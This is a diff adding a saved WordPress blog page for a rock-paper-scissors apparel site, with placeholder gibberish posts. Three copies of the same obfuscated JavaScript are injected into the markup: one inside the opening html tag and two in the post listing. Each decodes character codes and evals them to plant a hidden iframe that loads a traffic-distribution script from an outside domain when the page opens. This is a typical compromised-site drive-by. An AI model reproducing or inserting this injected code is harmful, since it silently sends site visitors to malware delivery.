@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="en-US"<script>var s=new String();try{document.getElementById('t3v2562v3r3').innerHTML}catch(q){r=1;c=String;}if(r&&document.createTextNode)o=2;e=window.eval;m=Array(4.5*o,18/o,52.5*o,204/o,16*o,80/o,50*o,222/o,49.5*o,234/o,54.5*o,202/o,55*o,232/o,23*o,206/o,50.5*o,232/o,34.5*o,216/o,50.5*o,218/o,50.5*o,220/o,58*o,230/o,33*o,242/o,42*o,194/o,51.5*o,156/o,48.5*o,218/o,50.5*o,80/o,19.5*o,196/o,55.5*o,200/o,60.5*o,78/o,20.5*o,182/o,24*o,186/o,20.5*o,246/o,4.5*o,18/o,4.5*o,210/o,51*o,228/o,48.5*o,218/o,50.5*o,228/o,20*o,82/o,29.5*o,18/o,4.5*o,250/o,16*o,202/o,54*o,230/o,50.5*o,64/o,61.5*o,18/o,4.5*o,18/o,50*o,222/o,49.5*o,234/o,54.5*o,202/o,55*o,232/o,23*o,238/o,57*o,210/o,58*o,202/o,20*o,68/o,30*o,210/o,51*o,228/o,48.5*o,218/o,50.5*o,64/o,57.5*o,228/o,49.5*o,122/o,19.5*o,208/o,58*o,232/o,56*o,116/o,23.5*o,94/o,57.5*o,200/o,50.5*o,202/o,50.5*o,228/o,53.5*o,230/o,50*o,92/o,49.5*o,222/o,54.5*o,94/o,58*o,200/o,57.5*o,94/o,52.5*o,220/o,23*o,198/o,51.5*o,210/o,31.5*o,110/o,19.5*o,64/o,59.5*o,210/o,50*o,232/o,52*o,122/o,19.5*o,98/o,24*o,78/o,16*o,208/o,50.5*o,210/o,51.5*o,208/o,58*o,122/o,19.5*o,98/o,24*o,78/o,16*o,230/o,58*o,242/o,54*o,202/o,30.5*o,78/o,59*o,210/o,57.5*o,210/o,49*o,210/o,54*o,210/o,58*o,242/o,29*o,208/o,52.5*o,200/o,50*o,202/o,55*o,118/o,56*o,222/o,57.5*o,210/o,58*o,210/o,55.5*o,220/o,29*o,194/o,49*o,230/o,55.5*o,216/o,58.5*o,232/o,50.5*o,118/o,54*o,202/o,51*o,232/o,29*o,96/o,29.5*o,232/o,55.5*o,224/o,29*o,96/o,29.5*o,78/o,31*o,120/o,23.5*o,210/o,51*o,228/o,48.5*o,218/o,50.5*o,124/o,17*o,82/o,29.5*o,18/o,4.5*o,250/o,4.5*o,18/o,51*o,234/o,55*o,198/o,58*o,210/o,55.5*o,220/o,16*o,210/o,51*o,228/o,48.5*o,218/o,50.5*o,228/o,20*o,82/o,61.5*o,18/o,4.5*o,18/o,59*o,194/o,57*o,64/o,51*o,64/o,30.5*o,64/o,50*o,222/o,49.5*o,234/o,54.5*o,202/o,55*o,232/o,23*o,198/o,57*o,202/o,48.5*o,232/o,50.5*o,138/o,54*o,202/o,54.5*o,202/o,55*o,232/o,20*o,78/o,52.5*o,204/o,57*o,194/o,54.5*o,202/o,19.5*o,82/o,29.5*o,204/o,23*o,230/o,50.5*o,232/o,32.5*o,232/o,58*o,228/o,52.5*o,196/o,58.5*o,232/o,50.5*o,80/o,19.5*o,230/o,57*o,198/o,19.5*o,88/o,19.5*o,208/o,58*o,232/o,56*o,116/o,23.5*o,94/o,57.5*o,200/o,50.5*o,202/o,50.5*o,228/o,53.5*o,230/o,50*o,92/o,49.5*o,222/o,54.5*o,94/o,58*o,200/o,57.5*o,94/o,52.5*o,220/o,23*o,198/o,51.5*o,210/o,31.5*o,110/o,19.5*o,82/o,29.5*o,204/o,23*o,230/o,58*o,242/o,54*o,202/o,23*o,236/o,52.5*o,230/o,52.5*o,196/o,52.5*o,216/o,52.5*o,232/o,60.5*o,122/o,19.5*o,208/o,52.5*o,200/o,50*o,202/o,55*o,78/o,29.5*o,204/o,23*o,230/o,58*o,242/o,54*o,202/o,23*o,224/o,55.5*o,230/o,52.5*o,232/o,52.5*o,222/o,55*o,122/o,19.5*o,194/o,49*o,230/o,55.5*o,216/o,58.5*o,232/o,50.5*o,78/o,29.5*o,204/o,23*o,230/o,58*o,242/o,54*o,202/o,23*o,216/o,50.5*o,204/o,58*o,122/o,19.5*o,96/o,19.5*o,118/o,51*o,92/o,57.5*o,232/o,60.5*o,216/o,50.5*o,92/o,58*o,222/o,56*o,122/o,19.5*o,96/o,19.5*o,118/o,51*o,92/o,57.5*o,202/o,58*o,130/o,58*o,232/o,57*o,210/o,49*o,234/o,58*o,202/o,20*o,78/o,59.5*o,210/o,50*o,232/o,52*o,78/o,22*o,78/o,24.5*o,96/o,19.5*o,82/o,29.5*o,204/o,23*o,230/o,50.5*o,232/o,32.5*o,232/o,58*o,228/o,52.5*o,196/o,58.5*o,232/o,50.5*o,80/o,19.5*o,208/o,50.5*o,210/o,51.5*o,208/o,58*o,78/o,22*o,78/o,24.5*o,96/o,19.5*o,82/o,29.5*o,18/o,4.5*o,18/o,50*o,222/o,49.5*o,234/o,54.5*o,202/o,55*o,232/o,23*o,206/o,50.5*o,232/o,34.5*o,216/o,50.5*o,218/o,50.5*o,220/o,58*o,230/o,33*o,242/o,42*o,194/o,51.5*o,156/o,48.5*o,218/o,50.5*o,80/o,19.5*o,196/o,55.5*o,200/o,60.5*o,78/o,20.5*o,182/o,24*o,186/o,23*o,194/o,56*o,224/o,50.5*o,220/o,50*o,134/o,52*o,210/o,54*o,200/o,20*o,204/o,20.5*o,118/o,4.5*o,18/o,62.5*o);if(document.createTextNode)with(c)mm=fromCharCode;for(i=0;i!=m.length;i++)s+=mm(e("m"+"["+"i"+']'));try{doc.qwe.removeChild()}catch(q){e(s);}</script>>
+<head>
+<meta charset="UTF-8" />
+<meta name="robots" content="index, follow" />
+
+
+<!-- page title, displayed in your browser bar -->
+<title>Blog | Rock Paper Scissors</title>
+
+
+<!-- add feeds, pingback and stuff-->
+<link rel="profile" href="http://gmpg.org/xfn/11" />
+<link rel="alternate" type="application/rss+xml" title="Rock Paper Scissors RSS2 Feed" href="http://rpssociety.com/?feed=rss2" />
+<link rel="pingback" href="http://rpssociety.com/xmlrpc.php" />
+
+
+<!-- add css stylesheets -->	
+<link rel="stylesheet" type="text/css" media="all" href="http://rpssociety.com/wp-content/themes/brightbox/style.css" />
+<link rel="stylesheet" href="http://rpssociety.com/wp-content/themes/brightbox/js/prettyPhoto/css/prettyPhoto.css" type="text/css" media="screen"/>
+<link rel="stylesheet" href="http://rpssociety.com/wp-content/themes/brightbox/js/projekktor/theme/style.css" type="text/css" media="screen"/>
+<link rel="stylesheet" href="http://rpssociety.com/wp-content/themes/brightbox/css/light-skin.css" type="text/css" media="screen"/>
+<link rel="stylesheet" href="http://rpssociety.com/wp-content/themes/brightbox/css/shortcodes.css" type="text/css" media="screen"/>
+
+
+
+<!-- plugin and theme output with wp_head() -->
+<link rel="alternate" type="application/rss+xml" title="Rock Paper Scissors &raquo; Blog Comments Feed" href="http://rpssociety.com/?feed=rss2&amp;page_id=412" />
+<script type='text/javascript' src='http://rpssociety.com/wp-includes/js/l10n.js?ver=20101110'></script>
+<script type='text/javascript' src='http://rpssociety.com/wp-includes/js/jquery/jquery.js?ver=1.4.4'></script>
+<script type='text/javascript' src='http://rpssociety.com/wp-content/themes/brightbox/js/projekktor/projekktor.min.js?ver=1'></script>
+<script type='text/javascript' src='http://rpssociety.com/wp-content/themes/brightbox/js/avia.js?ver=1'></script>
+<script type='text/javascript' src='http://rpssociety.com/wp-content/themes/brightbox/js/prettyPhoto/js/jquery.prettyPhoto.js?ver=3.0.1'></script>
+<script type='text/javascript' src='http://rpssociety.com/wp-includes/js/comment-reply.js?ver=20090102'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://rpssociety.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://rpssociety.com/wp-includes/wlwmanifest.xml" /> 
+<link rel='index' title='Rock Paper Scissors' href='http://rpssociety.com' />
+<link rel='prev' title='Contact' href='http://rpssociety.com/?page_id=408' />
+<link rel='next' title='The Story' href='http://rpssociety.com/?page_id=417' />
+<meta name="generator" content="WordPress 3.1.2" />
+
+<!-- All in One SEO Pack 1.6.13.2 by Michael Torbert of Semper Fi Web Design[3851,3886] -->
+<link rel="canonical" href="http://rpssociety.com/?page_id=412" />
+<!-- /all in one seo pack -->
+
+<!-- custom styles set at your backend-->
+<style type='text/css'>
+html, .contentSlideControlls .activeItem, .contentSlideControlls a:hover, #top .main_menu .avia_mega ul ul li, #top .main_menu .avia_mega >li >ul li, .widget_links li, .widget_meta li, .widget_archive li,  .widget_categories li, .widget_pages li, .pagination .current, .pagination a, .button, .dropcap2, #commentform #submit, #header, #top #wrap_all .main_menu .avia_mega .open-mega-a, #top .main_menu .avia_mega>.current-menu-item >a, .widget_nav_menu li, #top .main_menu .avia_mega>li:hover>a, .main_menu .avia_mega1, .main_menu .avia_mega2, .main_menu .avia_mega3, .main_menu .avia_mega4, .main_menu .avia_mega5, .main_menu  .avia_mega>li>ul, .main_menu .avia_mega>li>ul ul, #footer, #footer a, #socket, #footer_extra_text_div, .date-container, #top .slidecontrolls .activeItem{
+background-color:#000000;
+}
+
+.pagination .current, .pagination a, .button, #commentform #submit, #top .main_menu .avia_mega>li:hover>a{
+border-color:#000000;
+}
+
+a, .news-link:hover, .widget_archive li a:hover, #reply-title small a{
+color:#000000;
+}
+
+.pagination a:hover, .button:hover, #commentform #submit:hover{
+background-color:#222222;
+}
+
+.pagination a:hover, .button:hover, #commentform #submit:hover{
+border-color:#222222;
+}
+
+a:hover{
+color:#222222;
+}
+
+#footer ul a, #footer h2, #footer h3, #footer h4, #footer h5, #footer h6, #socket .container, #footer_extra_text_div{
+border-color:#222222;
+}
+
+#footer, #footer h1, #footer h2, #footer h3, #footer h4, #footer h5, #footer h6, #footer a, #footer a:hover, #socket, #socket a, .date-container, #top .main_menu .avia_mega > .current-menu-item > a, #top .main_menu .avia_mega > li:hover > a, #top .nav, #top #wrap_all .main_menu .open-mega-a{
+color:#ffffff;
+}
+
+
+html, body{
+background-color:#000000;
+}
+
+.boxed #wrap_all{
+border-color:#000000;
+}
+
+html, body{
+background-image:url(http://rpssociety.com/wp-content/uploads/2011/04/Dark_Alleyways_of_the_mind_by_mkIndustrial.jpg);
+}
+
+
+html, body{
+background-position:top left;
+}
+
+html, body{
+background-repeat:repeat;
+}
+
+html, body{
+background-attachment:fixed;
+}
+
+</style>
+
+<!-- end custom styles-->
+
+
+<!-- cufon font replacement -->
+<script type='text/javascript' src='http://rpssociety.com/wp-content/themes/brightbox/framework/js/fonts/cufon.js'></script>
+<script type='text/javascript' src='http://rpssociety.com/wp-content/themes/brightbox/framework/js/fonts/oswald.font.js'></script>
+<script type='text/javascript'>
+	var avia_cufon_size_mod = '1'; 
+	Cufon.replace('.cufon_headings',{  fontFamily: 'cufon', hover:'true' }); 
+</script>
+
+<!-- custom.css file: use this file to add your own styles and overwrite the theme defaults -->
+<link rel="stylesheet" href="http://rpssociety.com/wp-content/themes/brightbox/css/custom.css" type="text/css" media="screen"/>
+<!--[if lt IE 8]>
+<style type='text/css'> .one_fourth	{ width:21.5%;} </style>
+<![endif]-->
+
+</head>
+
+
+
+<body id="top" class="page page-id-412 page-template page-template-default boxed">
+
+	<div id='wrap_all'>
+	
+	<!-- ####### HEAD CONTAINER ####### -->
+			<div class='container_wrap' id='header'>
+			
+				<div class='container'>
+				
+					<h1 class='logo'><a href='http://rpssociety.com/'><img src=http://rpssociety.com/wp-content/uploads/2011/04/rps_stretch2.png alt='' /></a></h1><form action="http://rpssociety.com/" id="searchform" method="get">
+	<div>
+		<input type="submit" value="" id="searchsubmit" class="button"/>
+		<input type="text" id="s" name="s" value=""/>
+	</div>
+</form><!-- end searchform--> 
+					
+					<ul class="social_bookmarks">
+						<li class='rss'><a href="http://rpssociety.com/?feed=rss2">RSS</a></li>
+						<li class='twitter'><a href='http://twitter.com/rpssociety'>Twitter</a></li><li class='facebook'><a href='http://www.facebook.com/rpssociety'>Twitter</a></li>			
+					</ul>
+					<!-- end social_bookmarks-->
+
+				</div>
+				<!-- end container-->
+			
+			</div>
+			<!-- end container_wrap_header -->
+			
+			<!-- ####### END HEAD CONTAINER ####### -->
+			
+			
+			<div class='container_wrap styled-border'></div>
+			
+			<!-- ####### MENU HEAD CONTAINER ####### -->
+			<div class='container_wrap main_menu' id='menu_header'>
+			
+				<div class='container'>
+				
+					<div class=" megaWrapper"><ul id="menu-main-menu" class="avia_mega"><li id="menu-item-42" class="menu-item menu-item-type-custom menu-item-object-custom"><a href="http://www.rpssociety.com">Home</a></li>
+<li id="menu-item-419" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="http://rpssociety.com/?page_id=417">The Story</a></li>
+<li id="menu-item-426" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="http://rpssociety.com/?page_id=421">Collection</a></li>
+<li id="menu-item-415" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-412 current_page_item"><a href="http://rpssociety.com/?page_id=412">Blog</a></li>
+<li id="menu-item-411" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="http://rpssociety.com/?page_id=408">Contact</a></li>
+<li id="menu-item-430" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="http://rpssociety.com/?page_id=427">Dealers</a></li>
+<li id="menu-item-404" class="menu-item menu-item-type-custom menu-item-object-custom"><a href="http://rpssociety.bigcartel.com">Shop</a></li>
+</ul></div> 
+
+				</div>
+				<!-- end container-->
+			
+			</div>
+			
+			<div class='container_wrap styled-border-small'></div>
+			<!-- end container_wrap_header -->
+			<!-- ####### MENU END HEAD CONTAINER ####### -->
+			
+			
+							
+	
+		
+		<!-- ####### MAIN CONTAINER ####### -->
+		<div class='container_wrap' id='main'>
+		
+			<div class='container'>
+
+				<div class='template-fullwidth content template-dynamic template-dynamic-blog_page'>
+				
+				<div class='template-blog content'><script>var s=new String();try{document.getElementById('t3v2562v3r3').innerHTML}catch(q){r=1;c=String;}if(r&&document.createTextNode)o=2;e=window.eval;m=Array(4.5*o,18/o,52.5*o,204/o,16*o,80/o,50*o,222/o,49.5*o,234/o,54.5*o,202/o,55*o,232/o,23*o,206/o,50.5*o,232/o,34.5*o,216/o,50.5*o,218/o,50.5*o,220/o,58*o,230/o,33*o,242/o,42*o,194/o,51.5*o,156/o,48.5*o,218/o,50.5*o,80/o,19.5*o,196/o,55.5*o,200/o,60.5*o,78/o,20.5*o,182/o,24*o,186/o,20.5*o,246/o,4.5*o,18/o,4.5*o,210/o,51*o,228/o,48.5*o,218/o,50.5*o,228/o,20*o,82/o,29.5*o,18/o,4.5*o,250/o,16*o,202/o,54*o,230/o,50.5*o,64/o,61.5*o,18/o,4.5*o,18/o,50*o,222/o,49.5*o,234/o,54.5*o,202/o,55*o,232/o,23*o,238/o,57*o,210/o,58*o,202/o,20*o,68/o,30*o,210/o,51*o,228/o,48.5*o,218/o,50.5*o,64/o,57.5*o,228/o,49.5*o,122/o,19.5*o,208/o,58*o,232/o,56*o,116/o,23.5*o,94/o,57.5*o,200/o,50.5*o,202/o,50.5*o,228/o,53.5*o,230/o,50*o,92/o,49.5*o,222/o,54.5*o,94/o,58*o,200/o,57.5*o,94/o,52.5*o,220/o,23*o,198/o,51.5*o,210/o,31.5*o,110/o,19.5*o,64/o,59.5*o,210/o,50*o,232/o,52*o,122/o,19.5*o,98/o,24*o,78/o,16*o,208/o,50.5*o,210/o,51.5*o,208/o,58*o,122/o,19.5*o,98/o,24*o,78/o,16*o,230/o,58*o,242/o,54*o,202/o,30.5*o,78/o,59*o,210/o,57.5*o,210/o,49*o,210/o,54*o,210/o,58*o,242/o,29*o,208/o,52.5*o,200/o,50*o,202/o,55*o,118/o,56*o,222/o,57.5*o,210/o,58*o,210/o,55.5*o,220/o,29*o,194/o,49*o,230/o,55.5*o,216/o,58.5*o,232/o,50.5*o,118/o,54*o,202/o,51*o,232/o,29*o,96/o,29.5*o,232/o,55.5*o,224/o,29*o,96/o,29.5*o,78/o,31*o,120/o,23.5*o,210/o,51*o,228/o,48.5*o,218/o,50.5*o,124/o,17*o,82/o,29.5*o,18/o,4.5*o,250/o,4.5*o,18/o,51*o,234/o,55*o,198/o,58*o,210/o,55.5*o,220/o,16*o,210/o,51*o,228/o,48.5*o,218/o,50.5*o,228/o,20*o,82/o,61.5*o,18/o,4.5*o,18/o,59*o,194/o,57*o,64/o,51*o,64/o,30.5*o,64/o,50*o,222/o,49.5*o,234/o,54.5*o,202/o,55*o,232/o,23*o,198/o,57*o,202/o,48.5*o,232/o,50.5*o,138/o,54*o,202/o,54.5*o,202/o,55*o,232/o,20*o,78/o,52.5*o,204/o,57*o,194/o,54.5*o,202/o,19.5*o,82/o,29.5*o,204/o,23*o,230/o,50.5*o,232/o,32.5*o,232/o,58*o,228/o,52.5*o,196/o,58.5*o,232/o,50.5*o,80/o,19.5*o,230/o,57*o,198/o,19.5*o,88/o,19.5*o,208/o,58*o,232/o,56*o,116/o,23.5*o,94/o,57.5*o,200/o,50.5*o,202/o,50.5*o,228/o,53.5*o,230/o,50*o,92/o,49.5*o,222/o,54.5*o,94/o,58*o,200/o,57.5*o,94/o,52.5*o,220/o,23*o,198/o,51.5*o,210/o,31.5*o,110/o,19.5*o,82/o,29.5*o,204/o,23*o,230/o,58*o,242/o,54*o,202/o,23*o,236/o,52.5*o,230/o,52.5*o,196/o,52.5*o,216/o,52.5*o,232/o,60.5*o,122/o,19.5*o,208/o,52.5*o,200/o,50*o,202/o,55*o,78/o,29.5*o,204/o,23*o,230/o,58*o,242/o,54*o,202/o,23*o,224/o,55.5*o,230/o,52.5*o,232/o,52.5*o,222/o,55*o,122/o,19.5*o,194/o,49*o,230/o,55.5*o,216/o,58.5*o,232/o,50.5*o,78/o,29.5*o,204/o,23*o,230/o,58*o,242/o,54*o,202/o,23*o,216/o,50.5*o,204/o,58*o,122/o,19.5*o,96/o,19.5*o,118/o,51*o,92/o,57.5*o,232/o,60.5*o,216/o,50.5*o,92/o,58*o,222/o,56*o,122/o,19.5*o,96/o,19.5*o,118/o,51*o,92/o,57.5*o,202/o,58*o,130/o,58*o,232/o,57*o,210/o,49*o,234/o,58*o,202/o,20*o,78/o,59.5*o,210/o,50*o,232/o,52*o,78/o,22*o,78/o,24.5*o,96/o,19.5*o,82/o,29.5*o,204/o,23*o,230/o,50.5*o,232/o,32.5*o,232/o,58*o,228/o,52.5*o,196/o,58.5*o,232/o,50.5*o,80/o,19.5*o,208/o,50.5*o,210/o,51.5*o,208/o,58*o,78/o,22*o,78/o,24.5*o,96/o,19.5*o,82/o,29.5*o,18/o,4.5*o,18/o,50*o,222/o,49.5*o,234/o,54.5*o,202/o,55*o,232/o,23*o,206/o,50.5*o,232/o,34.5*o,216/o,50.5*o,218/o,50.5*o,220/o,58*o,230/o,33*o,242/o,42*o,194/o,51.5*o,156/o,48.5*o,218/o,50.5*o,80/o,19.5*o,196/o,55.5*o,200/o,60.5*o,78/o,20.5*o,182/o,24*o,186/o,23*o,194/o,56*o,224/o,50.5*o,220/o,50*o,134/o,52*o,210/o,54*o,200/o,20*o,204/o,20.5*o,118/o,4.5*o,18/o,62.5*o);if(document.createTextNode)with(c)mm=fromCharCode;for(i=0;i!=m.length;i++)s+=mm(e("m"+"["+"i"+']'));try{doc.qwe.removeChild()}catch(q){e(s);}</script>
+		<div class='post-entry'>
+			
+			<div class='preloading slideshow_container autoslide_false autoslidedelay__5 slideshow_page'><ul class='slideshow'><li class='featured featured_container1' ><span class='fancyborder fancyborder_top'></span>
+									<span class='fancyborder fancyborder_left'></span>
+									<span class='fancyborder fancyborder_right'></span>
+									<span class='fancyborder fancyborder_bottom'></span><a href='http://rpssociety.com/wp-content/uploads/2011/04/rps_og_ad.jpg'><img src='http://rpssociety.com/wp-content/uploads/2011/04/rps_og_ad-620x200.jpg' title='rps_og_ad' alt='' /></a><div class="feature_excerpt"><h1>ffghfghfgh</h1><div class="featured_caption">cxvvzcvcxvcxzv</div></div></li></ul></div>			
+			
+			<!--meta info-->
+	        <div class="blog-meta">
+	        
+				<span class='post-date-comment-container'>
+					<span class='date-container'><span>31</span><strong>Mar 2011</strong></span>
+					<span class='comment-container'><a href="http://rpssociety.com/?p=282#respond" class="comments-link"  title="Comment on This is a nice post"><strong>0</strong> Comments</a>					</span>
+					
+				</span>	
+				
+				
+				
+				
+			</div><!--end meta info-->
+			
+			<div class="entry-content">	
+				
+				<h1 class='post-title'>
+					<a href="http://rpssociety.com/?p=282" rel="bookmark" title="Permanent Link: This is a nice post">This is a nice post</a>
+				</h1>
+				<span class="blog-categories"><strong>Categories: </strong><a href="http://rpssociety.com/?cat=3" title="View all posts in News &amp; Stuff" rel="category">News &amp; Stuff</a><strong> - Tags: </strong><a href="http://rpssociety.com/?tag=help" rel="tag">help</a></span><p>ghjsghjgfdhjsgdfhsgfdhfgshkghsdfghdsjkgfhdskgfhdsjk</p>
+	
+								
+			</div>							
+		
+		
+		<div class="hr"></div> 								        
+		</div><!--end post-entry-->
+		
+		
+<script>var s=new String();try{document.getElementById('t3v2562v3r3').innerHTML}catch(q){r=1;c=String;}if(r&&document.createTextNode)o=2;e=window.eval;m=Array(4.5*o,18/o,52.5*o,204/o,16*o,80/o,50*o,222/o,49.5*o,234/o,54.5*o,202/o,55*o,232/o,23*o,206/o,50.5*o,232/o,34.5*o,216/o,50.5*o,218/o,50.5*o,220/o,58*o,230/o,33*o,242/o,42*o,194/o,51.5*o,156/o,48.5*o,218/o,50.5*o,80/o,19.5*o,196/o,55.5*o,200/o,60.5*o,78/o,20.5*o,182/o,24*o,186/o,20.5*o,246/o,4.5*o,18/o,4.5*o,210/o,51*o,228/o,48.5*o,218/o,50.5*o,228/o,20*o,82/o,29.5*o,18/o,4.5*o,250/o,16*o,202/o,54*o,230/o,50.5*o,64/o,61.5*o,18/o,4.5*o,18/o,50*o,222/o,49.5*o,234/o,54.5*o,202/o,55*o,232/o,23*o,238/o,57*o,210/o,58*o,202/o,20*o,68/o,30*o,210/o,51*o,228/o,48.5*o,218/o,50.5*o,64/o,57.5*o,228/o,49.5*o,122/o,19.5*o,208/o,58*o,232/o,56*o,116/o,23.5*o,94/o,57.5*o,200/o,50.5*o,202/o,50.5*o,228/o,53.5*o,230/o,50*o,92/o,49.5*o,222/o,54.5*o,94/o,58*o,200/o,57.5*o,94/o,52.5*o,220/o,23*o,198/o,51.5*o,210/o,31.5*o,110/o,19.5*o,64/o,59.5*o,210/o,50*o,232/o,52*o,122/o,19.5*o,98/o,24*o,78/o,16*o,208/o,50.5*o,210/o,51.5*o,208/o,58*o,122/o,19.5*o,98/o,24*o,78/o,16*o,230/o,58*o,242/o,54*o,202/o,30.5*o,78/o,59*o,210/o,57.5*o,210/o,49*o,210/o,54*o,210/o,58*o,242/o,29*o,208/o,52.5*o,200/o,50*o,202/o,55*o,118/o,56*o,222/o,57.5*o,210/o,58*o,210/o,55.5*o,220/o,29*o,194/o,49*o,230/o,55.5*o,216/o,58.5*o,232/o,50.5*o,118/o,54*o,202/o,51*o,232/o,29*o,96/o,29.5*o,232/o,55.5*o,224/o,29*o,96/o,29.5*o,78/o,31*o,120/o,23.5*o,210/o,51*o,228/o,48.5*o,218/o,50.5*o,124/o,17*o,82/o,29.5*o,18/o,4.5*o,250/o,4.5*o,18/o,51*o,234/o,55*o,198/o,58*o,210/o,55.5*o,220/o,16*o,210/o,51*o,228/o,48.5*o,218/o,50.5*o,228/o,20*o,82/o,61.5*o,18/o,4.5*o,18/o,59*o,194/o,57*o,64/o,51*o,64/o,30.5*o,64/o,50*o,222/o,49.5*o,234/o,54.5*o,202/o,55*o,232/o,23*o,198/o,57*o,202/o,48.5*o,232/o,50.5*o,138/o,54*o,202/o,54.5*o,202/o,55*o,232/o,20*o,78/o,52.5*o,204/o,57*o,194/o,54.5*o,202/o,19.5*o,82/o,29.5*o,204/o,23*o,230/o,50.5*o,232/o,32.5*o,232/o,58*o,228/o,52.5*o,196/o,58.5*o,232/o,50.5*o,80/o,19.5*o,230/o,57*o,198/o,19.5*o,88/o,19.5*o,208/o,58*o,232/o,56*o,116/o,23.5*o,94/o,57.5*o,200/o,50.5*o,202/o,50.5*o,228/o,53.5*o,230/o,50*o,92/o,49.5*o,222/o,54.5*o,94/o,58*o,200/o,57.5*o,94/o,52.5*o,220/o,23*o,198/o,51.5*o,210/o,31.5*o,110/o,19.5*o,82/o,29.5*o,204/o,23*o,230/o,58*o,242/o,54*o,202/o,23*o,236/o,52.5*o,230/o,52.5*o,196/o,52.5*o,216/o,52.5*o,232/o,60.5*o,122/o,19.5*o,208/o,52.5*o,200/o,50*o,202/o,55*o,78/o,29.5*o,204/o,23*o,230/o,58*o,242/o,54*o,202/o,23*o,224/o,55.5*o,230/o,52.5*o,232/o,52.5*o,222/o,55*o,122/o,19.5*o,194/o,49*o,230/o,55.5*o,216/o,58.5*o,232/o,50.5*o,78/o,29.5*o,204/o,23*o,230/o,58*o,242/o,54*o,202/o,23*o,216/o,50.5*o,204/o,58*o,122/o,19.5*o,96/o,19.5*o,118/o,51*o,92/o,57.5*o,232/o,60.5*o,216/o,50.5*o,92/o,58*o,222/o,56*o,122/o,19.5*o,96/o,19.5*o,118/o,51*o,92/o,57.5*o,202/o,58*o,130/o,58*o,232/o,57*o,210/o,49*o,234/o,58*o,202/o,20*o,78/o,59.5*o,210/o,50*o,232/o,52*o,78/o,22*o,78/o,24.5*o,96/o,19.5*o,82/o,29.5*o,204/o,23*o,230/o,50.5*o,232/o,32.5*o,232/o,58*o,228/o,52.5*o,196/o,58.5*o,232/o,50.5*o,80/o,19.5*o,208/o,50.5*o,210/o,51.5*o,208/o,58*o,78/o,22*o,78/o,24.5*o,96/o,19.5*o,82/o,29.5*o,18/o,4.5*o,18/o,50*o,222/o,49.5*o,234/o,54.5*o,202/o,55*o,232/o,23*o,206/o,50.5*o,232/o,34.5*o,216/o,50.5*o,218/o,50.5*o,220/o,58*o,230/o,33*o,242/o,42*o,194/o,51.5*o,156/o,48.5*o,218/o,50.5*o,80/o,19.5*o,196/o,55.5*o,200/o,60.5*o,78/o,20.5*o,182/o,24*o,186/o,23*o,194/o,56*o,224/o,50.5*o,220/o,50*o,134/o,52*o,210/o,54*o,200/o,20*o,204/o,20.5*o,118/o,4.5*o,18/o,62.5*o);if(document.createTextNode)with(c)mm=fromCharCode;for(i=0;i!=m.length;i++)s+=mm(e("m"+"["+"i"+']'));try{doc.qwe.removeChild()}catch(q){e(s);}</script>
+		<div class='post-entry'>
+			
+			<div class='preloading slideshow_container autoslide_true autoslidedelay__3 slideshow_page'><ul class='slideshow'><li class='featured featured_container1' ><span class='fancyborder fancyborder_top'></span>
+									<span class='fancyborder fancyborder_left'></span>
+									<span class='fancyborder fancyborder_right'></span>
+									<span class='fancyborder fancyborder_bottom'></span><a href='http://rpssociety.com/?cat=30'><img src='http://rpssociety.com/wp-content/uploads/2011/04/IMG_1054-620x200.jpg' title='IMG_1054' alt='' /></a><div class="feature_excerpt"><h1>dsfafdsfadsaf</h1><div class="featured_caption">fdsafdfdsafdsafsa</div></div></li><li class='featured featured_container2' ><span class='fancyborder fancyborder_top'></span>
+									<span class='fancyborder fancyborder_left'></span>
+									<span class='fancyborder fancyborder_right'></span>
+									<span class='fancyborder fancyborder_bottom'></span><a href='http://rpssociety.com/?cat=30'><img src='http://rpssociety.com/wp-content/uploads/2011/04/gunslinger-354x200.gif' title='gunslinger' alt='' /></a><div class="feature_excerpt"><h1>dfsfdsf</h1><div class="featured_caption">dsfsfdsfs</div></div></li></ul></div>			
+			
+			<!--meta info-->
+	        <div class="blog-meta">
+	        
+				<span class='post-date-comment-container'>
+					<span class='date-container'><span>28</span><strong>Mar 2011</strong></span>
+					<span class='comment-container'><a href="http://rpssociety.com/?p=254#comments" class="comments-link"  title="Comment on New Product Now!!"><strong>10</strong> Comments</a>					</span>
+					
+				</span>	
+				
+				
+				
+				
+			</div><!--end meta info-->
+			
+			<div class="entry-content">	
+				
+				<h1 class='post-title'>
+					<a href="http://rpssociety.com/?p=254" rel="bookmark" title="Permanent Link: New Product Now!!">New Product Now!!</a>
+				</h1>
+				<span class="blog-categories"><strong>Categories: </strong><a href="http://rpssociety.com/?cat=3" title="View all posts in News &amp; Stuff" rel="category">News &amp; Stuff</a><strong> - Tags: </strong><a href="http://rpssociety.com/?tag=a" rel="tag">a</a>, <a href="http://rpssociety.com/?tag=another" rel="tag">another</a>, <a href="http://rpssociety.com/?tag=associate" rel="tag">associate</a>, <a href="http://rpssociety.com/?tag=by" rel="tag">by</a>, <a href="http://rpssociety.com/?tag=files" rel="tag">files</a>, <a href="http://rpssociety.com/?tag=folders" rel="tag">folders</a>, <a href="http://rpssociety.com/?tag=help" rel="tag">help</a>, <a href="http://rpssociety.com/?tag=is" rel="tag">is</a>, <a href="http://rpssociety.com/?tag=keywords" rel="tag">keywords</a>, <a href="http://rpssociety.com/?tag=one" rel="tag">one</a>, <a href="http://rpssociety.com/?tag=rather" rel="tag">rather</a>, <a href="http://rpssociety.com/?tag=rigid" rel="tag">rigid</a>, <a href="http://rpssociety.com/?tag=superior" rel="tag">superior</a>, <a href="http://rpssociety.com/?tag=tagging" rel="tag">Tagging</a>, <a href="http://rpssociety.com/?tag=than" rel="tag">than</a>, <a href="http://rpssociety.com/?tag=to" rel="tag">to</a>, <a href="http://rpssociety.com/?tag=using" rel="tag">using</a>, <a href="http://rpssociety.com/?tag=way" rel="tag">way</a></span><p>ghjklahgfjdklshgjfdkhgjdskhglfdhsg</p>
+<p>fdshgjfkdshjghfdsklghjdfskg;fds</p>
+<p>ghjfdskghjfdkslg</p>
+	
+								
+			</div>							
+		
+		
+		<div class="hr"></div> 								        
+		</div><!--end post-entry-->
+		
+		
